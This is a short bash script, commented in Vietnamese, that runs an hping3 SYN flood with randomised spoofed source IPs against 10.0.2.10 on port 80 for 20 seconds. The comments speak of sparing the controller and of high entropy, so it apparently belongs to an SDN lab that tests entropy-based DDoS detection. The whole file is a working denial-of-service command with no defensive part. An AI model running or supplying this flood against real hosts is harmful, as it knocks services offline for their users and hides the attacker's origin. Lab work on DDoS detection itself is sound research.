#!/bin/bash
VICTIM=10.0.2.10
DURATION=20

echo "Bat dau IP Spoof Flood vao $VICTIM trong $DURATION giay..."
# Dung -i u500 thay vi --flood de khong lam chet controller
# --rand-source tao random IP moi goi -> entropy cao
timeout $DURATION hping3 --rand-source -S -p 80 -i u500 $VICTIM
echo "Hoan tat tan cong IP Spoof Flood!"